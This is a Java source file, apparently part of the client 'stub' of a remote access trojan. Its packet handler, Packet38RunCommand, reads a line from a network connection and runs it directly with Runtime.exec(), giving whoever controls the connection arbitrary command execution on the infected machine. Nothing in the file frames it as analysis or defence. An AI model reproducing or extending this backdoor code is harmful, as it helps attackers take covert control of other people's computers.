package com.redpois0n.stub.packets.incoming;

import com.redpois0n.stub.Connection;

public class Packet38RunCommand extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		String process = Connection.readLine();
		try {
			Runtime.getRuntime().exec(process);
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}

}
